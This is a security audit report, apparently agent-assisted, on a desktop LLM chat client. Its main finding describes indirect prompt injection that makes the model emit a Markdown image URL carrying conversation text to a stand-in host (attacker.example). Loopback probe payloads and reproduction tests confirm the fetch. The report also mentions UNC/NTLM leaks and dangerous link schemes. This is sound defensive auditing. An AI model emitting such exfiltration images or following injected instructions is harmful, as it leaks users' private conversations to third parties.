# Security and privacy — grade B

The parts the team wrote themselves are strong: OS credential stores with no plaintext fallback, redaction at the source with tests, redirects off, https enforced except loopback, a key bound to its scheme/host/port, parameterized SQL, validated backup paths, sanitized export names, and a minimal current-user-only IPC. No secret-shaped strings were found in 428 commits of history, and the package scan reports no vulnerable packages. What keeps this from an A is one real, reproduced hole at the third-party boundary: the Markdown renderer fetches image URLs found in model output (remote HTTP and local files) with no restriction and no test, which is the standard exfiltration and tracking channel in LLM chat clients. The remaining findings are low-severity hygiene: no way to remove a key, truncate-before-scrub, unbounded response reads, userinfo kept in the base URL, and deleted content left in free pages.

**Strengths**

- Credential storage: Keychain (SecItem) on macOS and Credential Manager on Windows, namespaced per channel. Failures throw CredentialUnavailableException and unsupported platforms refuse rather than degrade (src/Mindweave.Infrastructure/Credentials/CredentialStores.cs:24-35). The database holds only a credential reference.
- Key reads are confined by an architecture test: tests/Mindweave.Architecture.Tests/SeamTests.cs:13-25 fails if any file outside an allow-list mentions ICredentialStore.
- The key cannot follow a redirect or go to another host. SocketsHttpHandler has AllowAutoRedirect=false and 3xx becomes an explicit error (ChatCompletionsClient.cs:34, 274-277). ServiceAddress.SameService compares scheme, host and port before a saved key is reused (ModelSettingsService.cs:36-39, 88, 229). Plain http is refused except for loopback (ModelSettingsService.cs:213-216). No certificate-validation override exists anywhere in src.
- Redaction at the source: every ChatClientException leaving the client is scrubbed of the exact key plus key-shaped patterns (ChatCompletionsClient.cs:56-58, 117-119, 303-304). RequestTrace scrubs again before ai_request, the file logger scrubs every line including exception text (FileLoggerProvider.cs:61), and migration v3 scrubbed legacy error_detail rows. RedactionTests, FileLoggerRedactionTests and RequestTraceTests cover this; TRACK records that the too-short fake test key was fixed.
- Log content is disciplined: all 60-odd LoggerMessage templates carry IDs, counts, enum kinds and file paths, never message bodies, titles or prompts. Reasoning text is reduced to a length (ChatCompletionsClient.cs:252-253).
- SQL is parameterized throughout. The interpolated fragments I traced are compile-time constants or generated parameter names (for example SqliteStatisticsStore.cs:75-90, 172-180; SqliteSummaryStore.cs:54). VACUUM INTO binds its path as a parameter (SqliteBackupFiles.cs:213-214).
- Backup and restore path handling is defensive: BackupPathOf requires the file to sit directly in this data directory's backup folder and match a strict name regex before any delete or check (SqliteBackupFiles.cs:360-371, 399), and leftover deletion validates every path before deleting any (145-155).
- Export file names are sanitized for Windows-reserved characters, device names, leading/trailing dots and length (SummaryMarkdown.cs:87-118). The destination comes only from the system save dialog and is written atomically.
- Single-instance IPC surface is minimal: one activation byte and one acknowledge byte, server pipe created with PipeOptions.CurrentUserOnly, no payload parsed (SingleInstance.cs:146-160).
- scripts/real-api.sh keeps the key off the command line and out of files (hidden keychain prompt, passed only via the test process environment, config directory chmod 700). scripts/package-source.sh uses git archive and checks for .env, .db and key files.
- Outbound data is disclosed and controllable: workspace-name suggestions say that titles are sent to the model and may cost money, and the background variant has a settings switch (UiText.Settings.cs:53-56). Delete dialogs say a backup is kept and where to find it.
- Link clicks in rendered Markdown are suppressed (AnswerView.axaml.cs:51, SummaryView.axaml.cs:26). A loopback probe found raw HTML <img> tags and LaTeX \includegraphics / \href trigger no fetch.

**Not examined**

- Whether the LinkClick Handled=true suppression actually stops LiveMarkdown's default browser launch under a real pointer click; I did not simulate one (see the related finding).
- Windows behaviour of file:// and UNC image sources (SMB/NTLM leak). Inferred from the confirmed local-file handler on macOS, not run on Windows.
- RaTeX native LaTeX parser robustness against hostile input (memory safety, pathological macros), and Mermaid/TextMate handling of hostile code blocks. Only \includegraphics and \href were probed for network fetches.
- Code signing, notarization and installer integrity for published builds, and how macOS Keychain ACLs behave across unsigned rebuilds (legacy login keychain, no kSecAttrAccessible set in MacKeychainCredentialStore.Write). No signing material or docs were found in the repo.
- Live behaviour of the credential stores (locked keychain, SSH session 1312); relied on code reading and TRACK notes.
- Whether the bundled e_sqlite3 is compiled with SQLITE_SECURE_DELETE; only the absence of the pragma in source was checked.
- scripts/windows.sh, mailbox.sh, mailbox.ps1 and perf.sh beyond a keyword scan (SSH options, no embedded secrets); remote-side quoting and injection were not audited line by line.
- tests/Mindweave.TestHost fault-injection switches. I confirmed src reads only MINDWEAVE_DATA_DIR from the environment, but did not check whether TestHost binaries could ship.
- Git history was scanned with regexes for common key formats (sk-, AIza, ghp_, xox, JWT, private key blocks, Zhipu-style id.secret) across all 428 commits, plus names of added files; no entropy-based scan, and the binary .db fixtures under tests/fixtures were not opened.
- On-disk permissions of the data directory, logs and backups when MINDWEAVE_DATA_DIR points outside the per-user default location.
- Prompt-injection resistance of the summary, title and compression prompts themselves.

### security-1. Model output can make the app fetch arbitrary URLs and read local files through Markdown images

- Final: **high** (confirmed (one verifier lowered it)); auditor said high
- Where: `src/Mindweave.Desktop/Views/Conversations/AnswerView.axaml.cs:51`; effort S

**Evidence.** AnswerView (line 32, 51) and SummaryView (src/Mindweave.Desktop/Views/Pages/SummaryView.axaml.cs:17, 26) render model text with a default LiveMarkdown `MarkdownRenderer`; the only hardening is `_renderer.LinkClick += (_, e) => e.Handled = true;`. Nothing in src references AsyncImageLoader, image handlers or an image node filter, and MarkdownSetup.cs:22-23 only adds math. LiveMarkdown.Avalonia 2.5.1 documents its image handlers as: "Default is `Http`, `LocalFile`, `AvaloniaResource`. (HTTP supports redirects and HTTPS)". I reproduced this with a throwaway headless project in the scratchpad (same packages, loopback listener only): rendering `![a](http://127.0.0.1:PORT/md-image.png?d=SECRET)` produced `GET /md-image.png?d=SECRET` on both render paths Mindweave uses (`MarkdownDocumentUpdate.Full` and the streaming `ObservableStringBuilder`), with no user action. `![x](file:///.../local.png)` loaded the local file (Image.Source non-null). Raw `<img>` and LaTeX `\includegraphics` / `\href` did not fetch. docs/architecture.md:185 lists images as outside the first-version scope, so this is unintended surface. Not in TRACK.md.

**Failure scenario.** A user pastes a web page or document containing hidden instructions, or uses a third-party relay (TRACK records using one), and the answer contains `![](https://attacker.example/p?d=<text from this conversation>)`. As the answer streams in, the app issues the GET: conversation content, the user's IP and the reading time reach the attacker with zero clicks. It fires again whenever the answer or a summary containing it is reopened. On Windows, a `file://host/share/x.png` source would plausibly trigger an SMB connection and leak the NTLM hash (not tested). http:// is accepted, so the https-only rule applied to the API does not cover this path.

**Recommendation.** Remove image loading from the rendering path until images are a designed feature: set the renderer's image handlers to an empty set, or to data: only (`AsyncImageLoader.SetHandlers`), or replace the image inline node so it renders alt text plus the URL as plain text. Add a Desktop test that renders `![x](http://127.0.0.1:port/…)` and `file://` through AnswerView and SummaryView (full and streaming paths) and asserts no connection and no Image source. If remote images are wanted later, make them click-to-load, https-only, no redirects.

**Reproduction attempt: partially confirmed, medium.** The mechanism is real and I could not refute it; the severity and the "read local files" framing are overstated.

What holds:
- Both views create a default `MarkdownRenderer` and the only hardening is swallowing link clicks. There is no image handler restriction, node filter or custom template anywhere in src or tests.
- `MarkdownSetup.EnsureRegistered` only adds math parsing and math nodes. App.axaml includes LiveMarkdown's stock Defaults/Styles; Conversation.axaml only restyles fonts and list markers.
- LiveMarkdown.Avalonia 2.5.1's own XML docs state the default handlers are Http, LocalFile and AvaloniaResource, with redirects followed.
- I re-ran the auditor's prebuilt probe (loopback only). Both render paths Mindweave uses issued a GET carrying the query string with no user action: `GET /md-image.png?d=SECRET` (Full) and `GET /live-md-image.png?d=SECRET` (streaming builder).
- AnswerView uses exactly those two paths (streaming builder at 272-273, Full at 282); SummaryView uses Full at 85.
- No design decision covers this. docs/architecture.md:185 puts images outside first-version scope, and TRACK.md and docs/design have no mention of image loading or remote resources. No test asserts images are blocked.

Why medium rather than high:
- Exfiltration needs a prompt injection that makes the model emit an image URL containing conversation text. Mindweave has no browsing, tool calls or file ingestion (evolution-seams.md:34: Chat Completions defaults to streaming only), so the only injection route is content the user pastes in.
- The malicious-relay scenario adds little: a relay already receives the whole conversation and the user's IP.
- What can leak is conversation or summary text in context, plus IP and read-time tracking on every reopen. API keys and other local data are not in model context.
- The file:// path only displays a local image to the same user; nothing is sent anywhere. It is not a file-read primitive for an attacker.
- The Windows UNC/NTLM leak is speculation; the auditor did not test it and neither did I.

It remains a genuine zero-click outbound channel in a local-first app, accepts plain http, and the fix is small. The recommendation (empty or data:-only handlers, or render images as alt text, plus a regression test) is sound.

*Corrections to the finding.* 1. Severity high -> medium. The only injection route is hostile content the user pastes; the app has no browsing, tools or file ingestion. A malicious relay gains nothing it does not already have.
2. "Read local files" in the title overstates impact. A file:// image is decoded and shown to the local user only; there is no path for its contents to leave the machine.
3. The file:// load is not independently verified. The Program.cs currently in the scratchpad has no file:// case (an unused `localFile` variable and a local.png remain), so that part rests on the auditor's statement plus the library's documented LocalFile default handler.
4. The Windows UNC/NTLM hash leak is untested speculation and should not count toward severity.
5. The LaTeX \includegraphics and \href no-fetch result is confirmed by my re-run (only the two Markdown image GETs arrived). The current probe does not exercise raw <img>, so that claim is unverified.

<details><summary>Reproduction</summary>

Re-ran the auditor's existing prebuilt probe; no rebuild, loopback listener only, nothing written to the worktree.

Command: dotnet bin/Release/net10.0/probe.dll (run from /private/tmp/claude-501/-Users-meilingluo-Developer-Projects-mindweave-worktrees-claude-auto/741bda69-6233-404f-b4a0-8bc89d0ed5bc/scratchpad/sec-img-probe)

The probe builds a default MarkdownRenderer with LinkClick handled, the same math pipeline setup as MarkdownSetup, and renders once via MarkdownDocumentUpdate.Full and once via ObservableStringBuilder.

Input markdown:
![a](http://127.0.0.1:56064/md-image.png?d=SECRET)
$\includegraphics{http://127.0.0.1:56064/tex-graphics.png}$ and $\href{http://127.0.0.1:56064/tex-href}{x}$
$$\includegraphics[width=1em]{http://127.0.0.1:56064/tex-block.png}$$

Output:
[full] Image src=http://127.0.0.1:56064/md-image.png?d=SECRET loaded=False
[full] done
[live] Image src=http://127.0.0.1:56064/live-md-image.png?d=SECRET loaded=False
[live] done
HITS: 2
  GET /md-image.png?d=SECRET HTTP/1.1 | UA=none
  GET /live-md-image.png?d=SECRET HTTP/1.1 | UA=none

loaded=False is expected: the listener answers 404. The file:// case was not re-run.

</details>

**Reproduction attempt: confirmed, high.** Reproduced end to end through the real app, not just a bare renderer. Two headless xUnit tests in tests/Mindweave.Desktop.Tests drove the DesktopHarness with the fake chat client, a loopback TCP listener and a temp PNG; both failed in the way the finding predicts.

- Streaming path: while the answer was still streaming (IsStreaming true, reply held), the listener received `GET /stream.png?d=SECRET-FROM-CONVERSATION` with no user action.
- Finished/stored path: the listener received `GET /stored.png?d=SECRET-FROM-CONVERSATION`, and both Image controls in the AnswerView (the http one and the file:// one) ended with a non-null Source, so the local file was read and decoded.

Code reading matches: AnswerView and SummaryView each create a default `MarkdownRenderer` and only set `LinkClick` handled; MarkdownSetup only registers math; nothing in src configures AsyncImageLoader or image handlers. docs/architecture.md:185 lists images as outside first-version scope, and TRACK.md has no entry for this.

Severity stays high: this is the standard zero-click Markdown-image exfiltration channel for LLM chat apps, reachable by indirect prompt injection in pasted content, and it accepts plain http.

The worktree was temporarily detached at track/claude-auto (1ba95c9) because the assigned worktree branch is based on main and has no product code. It is now back on its original branch and clean; nothing was committed.

*Corrections to the finding.* - "Read local files" is accurate only as open-and-decode-for-display: the file's bytes are not sent anywhere by this path. The exfiltration channel is the remote URL's path and query; the file:// surface on its own is a file-existence probe, a decode attack surface, and the possible UNC/SMB vector.
- The Windows `file://host/share` NTLM-hash leak remains untested, as the finding itself says; I could not test it on macOS.
- "Fires again whenever the answer or a summary is reopened" was not verified. The package README says the loader uses an in-memory cache by default, so repeat fetches within one process run may be suppressed; a fetch after restart is likely but untested.
- SummaryView was not exercised by a test. It uses the identical default renderer and the same Full-document path that the finished-answer test covers, so I consider it confirmed by code reading only.
- The third-party-relay scenario adds little: a malicious relay already sees the conversation. The meaningful vector is indirect prompt injection sending data to a different third party, plus IP and read-time disclosure.
- The raw `<img>` and LaTeX `\includegraphics` / `\href` non-fetch claims were not re-tested.

<details><summary>Reproduction</summary>

Temporary file tests/Mindweave.Desktop.Tests/ReproMarkdownImageFetchTests.cs (deleted afterwards). A loopback TcpListener records each request line and answers with a 1x1 PNG. Core of the two tests:

```csharp
[AvaloniaFact]
public async Task A_streaming_answer_with_a_markdown_image_does_not_contact_the_image_host()
{
    await using var app = DesktopHarness.Create();
    var window = app.ShowWindow();
    await app.StartWithWorkspaceAsync("火车");
    await app.ConfigureModelAsync();
    var held = app.Client.Hold($"前文。\n\n![a](http://127.0.0.1:{Port}/stream.png?d=SECRET-FROM-CONVERSATION)\n\n后文还在写");
    app.ShellPage.Conversations.NewCommand.Execute(null);
    var draft = Assert.IsType<NewConversationViewModel>(app.Workbench.CurrentPage);
    draft.Composer.Text = "问";
    await draft.Composer.SendCommand.ExecuteAsync(null);
    await held.Started.Task.WaitAsync(TimeSpan.FromSeconds(5));
    var page = Assert.IsType<ConversationViewModel>(app.Workbench.CurrentPage);
    await page.Loaded;
    await UiWait.UntilAsync(() => page.Messages.Count == 2 && page.Messages[1] is { IsStreaming: true });
    await PumpAsync(3000, () => !_requests.IsEmpty);
    var whileStreaming = _requests.ToArray();
    var stillStreaming = page.Messages[1].IsStreaming;
    held.Finish(); window.Close();
    Assert.True(stillStreaming);
    Assert.True(whileStreaming.Length == 0, "Requests received while the answer was still streaming: " + string.Join(" | ", whileStreaming));
}

[AvaloniaFact]
public async Task A_finished_answer_with_markdown_images_neither_contacts_a_host_nor_reads_a_local_file()
{
    var local = Path.Combine(_dir, "local.png");
    await File.WriteAllBytesAsync(local, Png, TestContext.Current.CancellationToken);
    await using var app = DesktopHarness.Create();
    var window = app.ShowWindow();
    await app.StartWithWorkspaceAsync("火车");
    await app.ConfigureModelAsync();
    app.Client.Reply($"前文。\n\n![a](http://127.0.0.1:{Port}/stored.png?d=SECRET-FROM-CONVERSATION)\n\n![x]({new Uri(local).AbsoluteUri})\n\n后文。");
    // ... send the question, wait until Messages[1].CanBranch and its AnswerView exists ...
    List<Image> Loaded() => [.. window.GetVisualDescendants().OfType<AnswerView>().SelectMany(a => a.Renderer.GetVisualDescendants().OfType<Image>()).Where(i => i.Source is not null)];
    await PumpAsync(3000, () => !_requests.IsEmpty && Loaded().Count >= 2);
    // ...
    Assert.True(requests.Length == 0 && loaded == 0,
        $"Requests: [{string.Join(" | ", requests)}]; Image controls in the answer: {total}, with a loaded Source: {loaded}");
}
```

Command, run in tests/Mindweave.Desktop.Tests: `dotnet test --filter "FullyQualifiedName~ReproMarkdownImageFetchTests"`

Actual output:
```
Failed ...A_streaming_answer_with_a_markdown_image_does_not_contact_the_image_host [1 s]
  Error Message:
   Requests received while the answer was still streaming: GET /stream.png?d=SECRET-FROM-CONVERSATION HTTP/1.1
Failed ...A_finished_answer_with_markdown_images_neither_contacts_a_host_nor_reads_a_local_file [177 ms]
  Error Message:
   Requests: [GET /stored.png?d=SECRET-FROM-CONVERSATION HTTP/1.1]; Image controls in the answer: 2, with a loaded Source: 2
Failed!  - Failed:     2, Passed:     0, Skipped:     0, Total:     2, Duration: 1 s - Mindweave.Desktop.Tests.dll (net10.0)
```

The assertions are on whether a request happened at all, not on timing, so load on the machine does not affect the result.
```

</details>

### security-2. A saved API key cannot be removed from the app, and replaced or restored-over keys can be orphaned in the OS store

- Final: **low** (confirmed in part); auditor said medium
- Where: `src/Mindweave.Application/Models/ModelSettingsService.cs:132`; effort M

**Evidence.** The only call to `ICredentialStore.DeleteAsync` in src is ModelSettingsService.cs:153, inside `CleanUpRetiredCredentialsAsync`, which deletes only references listed in the database's retired list. `IModelSettings` / `ModelSettingsService` expose Save, Discover and Test but no way to clear a key or delete the connection, and `SaveAsync` throws MissingKey when no key would remain (lines 103-106). The retired list lives in the database (lines 89, 126), so it travels with backups and restores. Neither credential store has an enumerate operation, so nothing can sweep items by service or prefix.

**Failure scenario.** (1) A user wants to stop using Mindweave on a shared or handed-over machine, or to pull a leaked key: there is no control for it, and the key stays in Keychain / Credential Manager under `Mindweave.<channel>` until removed by hand in OS tools. (2) The user saves key K1, a backup is taken (migration or before-delete), then replaces it with K2 (K1 deleted from the store) and later restores the backup. The restored database points at K1's reference, which is gone, so generation fails with NotConfigured; K2's reference is in no database any more and stays in the OS store indefinitely.

**Recommendation.** Add an explicit remove-key / remove-connection action that deletes the active and retired references (deferring ones still used by unfinished tasks, as today). Add an enumerate-by-service operation to both stores (SecItemCopyMatching with kSecMatchLimitAll; CredEnumerateW with the `Mindweave.<channel>/*` filter) and sweep references unknown to the database at startup and after a restore. Show a clear message when a restored database references a missing key.

**Skeptic: partially confirmed, low.** The cited code is accurate, but the title overstates the impact and the realistic harm is credential hygiene, not exposure.

What holds:
- `credentials.DeleteAsync` has exactly one call site in src (ModelSettingsService.cs:153), reached only through the retired list.
- `IModelSettings` exposes only Get, Save, DiscoverModels and Test. `SaveAsync` throws MissingKey when no key would remain (lines 103-106). There is no clear-key or delete-connection path.
- `ICredentialStore` has only Read, Write and Delete. The mac store uses `kSecMatchLimitOne` only, and there is no `CredEnumerate` anywhere, so nothing can sweep by service.
- The retired list is stored in the database (`retired_credential_refs` in SqliteModelSettingsStore.cs:9), so it travels with backups.
- In-app restore of a whole-database backup exists (docs/design/s7-ui-polish.md:646), and no backup or restore code touches credentials. Scenario 2 is therefore reachable by reading the code: the restored database points at K1's deleted reference, and K2's reference is in no database and is never deleted. I did not run it.

What is overstated:
- "A saved API key cannot be removed" is too strong. Saving any replacement string retires the old reference and deletes the real secret from the OS store immediately (lines 95-97, 128, 153), unless an unfinished task still uses it. A leaked key can be pulled this way; what cannot be done is ending up with no key stored at all.
- No requirement asks for a remove-key control. architecture.md:261 says there is no credential-version management UI and specifies only cleanup of replaced items; v1 is a single active configuration. Scenario 1 is a missing feature, not a violation of the design.
- The recommended "clear message when a restored database references a missing key" already exists generically: GenerationRequests.cs:150-152 fails with NotConfigured and "The API key for this connection is missing", and the Windows checklist (s6-windows-checklist.md:46) covers a key deleted outside the app.
- Orphaned items stay in Keychain / Credential Manager under the same OS user, readable only by that user, so there is no confidentiality loss beyond what a current key already carries. Scenario 2 also needs an uncommon sequence (replace key, then restore an older backup).

Related gaps the finding missed, which support the orphaning theme:
- `CleanUpRetiredCredentialsAsync` is called only from `SaveAsync` (line 128) and one test. A retired key deferred because a task was unfinished is not deleted at startup or when the task ends; it waits for the next settings save, possibly forever.
- `SaveAsync` writes the new key to the OS store (line 94) before `SaveActiveAsync` (line 109) and `SetRetiredCredentialRefsAsync` (line 126), with no compensation. A failure or crash after line 94 orphans the new reference; one between 109 and 126 orphans the old one.

Net: a real hygiene gap (no way to reach a no-key state, several orphan paths, no sweep), but low severity rather than medium.

*Corrections to the finding.* - "A saved API key cannot be removed from the app" should read "the app cannot reach a no-key state". Saving a replacement value deletes the previous secret from the OS store immediately, unless an unfinished task still references it.
- The recommendation to show a clear message for a missing key after restore is already met generically (GenerationRequests.cs:150-152).
- No requirement or architecture clause calls for a remove-key control, so scenario 1 is a feature gap, not a defect.
- Severity should be low: orphaned items stay in the per-user OS credential store, and scenario 2 needs an uncommon sequence.
- The finding missed two stronger orphan paths: retired-key cleanup runs only on the next settings save (not at startup or task completion), and SaveAsync writes the key to the OS store before two separate database writes with no compensation.

### security-3. Error detail is cut to 500 characters before the key is scrubbed, so a key straddling the cut survives in part

- Final: **low** (not verified); auditor said low
- Where: `src/Mindweave.Infrastructure/Ai/ChatCompletionsClient.cs:290`; effort S

**Evidence.** `ThrowIfFailedAsync` builds `detail = $"HTTP {status}: {Limit(detail)}"` (line 290; `Limit` cuts at MaxErrorDetail = 500, lines 316-320), and the mid-stream error path does the same at line 246. Only afterwards does `Redacted(ex, apiKey)` run `Redaction.Scrub(ex.Message, apiKey)` (lines 58, 119, 303-304). `Scrub` removes the known key by exact `text.Replace(knownSecret, …)` (Redaction.cs:22), which cannot match a truncated key. The fallback patterns cover `sk-`/`pk-`/`rk-`/`AIza` prefixes, `Bearer …` and labelled `api_key=` forms (Redaction.cs:30-38). Zhipu-style `<hex>.<alnum>` keys match none of them, and Zhipu is a built-in preset (ProviderPresets.cs:29).

**Failure scenario.** A relay or gateway answers 401 with a long body that echoes the presented key without a label, and the echo begins near character 480. The first ~20 characters of the key stay in the message, are stored in message / generation_task / ai_request error_detail, shown in the UI, and copied into every later backup. The tests use a key placed well inside the limit, so this is not covered.

**Recommendation.** Scrub before truncating: pass the key into ThrowIfFailedAsync and Parse (or scrub the raw text first) and apply Limit afterwards. Add a test where the echoed key crosses the 500-character boundary with a key that has no recognizable prefix.

### security-4. Responses from the configured endpoint are read without size limits (error bodies, SSE lines, any compression)

- Final: **low** (not verified); auditor said low
- Where: `src/Mindweave.Infrastructure/Ai/ChatCompletionsClient.cs:279`; effort S

**Evidence.** The handler enables `AutomaticDecompression = DecompressionMethods.All` (line 37). On a non-2xx status the whole body is read with `response.Content.ReadAsStringAsync` (line 279) and only then cut to 500 characters. `ListModelsCoreAsync` buffers the full response (`HttpCompletionOption.ResponseContentRead`, line 131) on an HttpClient built with only `Timeout` set (InfrastructureServices.cs:49), so the default 2 GB buffer cap applies. `SseReader.ReadEventAsync` uses `StreamReader.ReadLineAsync` and appends to a StringBuilder with no line or event cap (SseReader.cs:20, 59). The only bounds are time (90 s first byte, 120 s idle, 30 s model list). The `x-request-id` header value is also stored as-is, unscrubbed and with no length cap (ChatCompletionsClient.cs:306-309, SqliteAiRequestStore.cs:43).

**Failure scenario.** A misbehaving or hostile relay, or a mistyped base URL pointing at a large download or streaming endpoint, returns a multi-gigabyte body (or a small gzip that expands to one) for /models or as an error body, or an SSE stream with one endless `data:` line. The app allocates until it runs out of memory and dies, taking any in-flight answers in other conversations with it.

**Recommendation.** Cap what is read: read error bodies through a bounded reader (for example 64 KB), set MaxResponseContentBufferSize for the model list (a few MB), enforce a maximum SSE line and event size, and fail with InvalidResponse beyond that. Truncate provider_request_id to a sane length and pass it through Redaction.Scrub.

### security-5. A base URL with embedded credentials (user:pass@host) is accepted and stored in plaintext

- Final: **low** (not verified); auditor said low
- Where: `src/Mindweave.Application/Models/ModelSettingsService.cs:218`; effort S

**Evidence.** `NormalizeBaseUrl` returns `uri.GetLeftPart(UriPartial.Path).TrimEnd('/')` (line 218). `UriPartial.Path` keeps the userinfo component, and nothing rejects or strips it. The result is saved as the connection's base URL (lines 109-113), frozen into every task's ModelSnapshot, written to `ai_request.base_url` for workspace-name requests (RequestTrace.cs:96, SqliteAiRequestStore.cs:36), and copied into every backup. `ServiceAddress.SameService` compares only `UriComponents.SchemeAndServer` (line 39), so userinfo is ignored when deciding whether a saved key applies. ICredentialStore.cs:5 states the design rule: "Secrets never enter the database".

**Failure scenario.** A user of a self-hosted gateway pastes `https://alice:gateway-token@llm.example.com/v1`. The token is written in clear to mindweave.db and all subsequent backups, breaking the no-secrets-in-the-database rule. It is not even used, because SocketsHttpHandler does not turn userinfo into an Authorization header, so the user gets an auth failure while the secret has already been persisted.

**Recommendation.** Reject base URLs whose `Uri.UserInfo` is non-empty with a specific message, or strip it, in NormalizeBaseUrl. Add a ModelSettingsTests case.

### security-6. "Permanently deleted" content stays recoverable in the live database file and in earlier backups

- Final: **low** (not verified); auditor said low
- Where: `src/Mindweave.Infrastructure/Sqlite/SqliteConnections.cs:28`; effort S

**Evidence.** The per-connection pragmas are only `PRAGMA synchronous = FULL; PRAGMA busy_timeout = …` (line 28) plus WAL (SqliteDatabase.cs:550). A search of src finds no `secure_delete`, no `auto_vacuum`, and no VACUUM other than `VACUUM INTO` for backups. With SQLite defaults, deleted rows remain in free pages and the WAL until overwritten. Migration backups (newest N kept) and before-restore backups made earlier still contain the rows and are not touched by a later delete. A conversation without branches or summaries is deleted directly with no dialog mention of backups (requirements §6.1, line 234), while requirements line 224 says body text is actually cleared ("正文与阅读状态实际清除") and the UI says "永久删除".

**Failure scenario.** A user deletes a conversation containing something sensitive and later shares or loses the machine or the data folder. The text is still readable with `strings` or a forensic tool from mindweave.db free pages, and in full from any older `backups/mindweave-v*.db`. Nothing in the simple-delete flow tells the user that older backups still hold it.

**Recommendation.** Set `PRAGMA secure_delete = ON` (or FAST) on write connections so freed pages are zeroed. After a delete, tell the user when older backups still contain the deleted data and offer to remove them from the existing backup list. Document that the database and backups are unencrypted.

### security-7. Link suppression depends on an undocumented library behaviour and no test covers it

- Final: **low** (not verified); auditor said low
- Where: `src/Mindweave.Desktop/Views/Pages/SummaryView.axaml.cs:26`; effort S

**Evidence.** The only thing stopping a model-supplied link from opening is `_renderer.LinkClick += (_, e) => e.Handled = true;` (here and AnswerView.axaml.cs:51). LiveMarkdown's `Link` type has `Open()` ("Opens the link in the default web browser"), an `OpenCommand`, and a `LinkContextMenu` property, and the assembly imports `LaunchUriAsync`. The package's XML docs do not say that a handled LinkClick suppresses the default open. A search of tests/ for LinkClick, LaunchUri and LinkContextMenu returns nothing. I did not simulate a click, so whether suppression works today is unverified either way.

**Failure scenario.** A LiveMarkdown upgrade (or today's version, if Handled is not honoured on some path such as keyboard activation or a context menu) starts passing model-supplied hrefs to the OS launcher. Clicking a link in an answer would then open arbitrary schemes (`file:`, `ms-msdt:`, `smb:`, custom app URLs) with no allow-list. No test would fail.

**Recommendation.** Make it explicit and tested. Either register a link node that renders links as inert text, or handle LinkClick with an allow-list (https only, with a confirmation that shows the host) through an ISystemShell method. Add a headless test that clicks and keyboard-activates a link in AnswerView and SummaryView and asserts the launcher is not invoked.

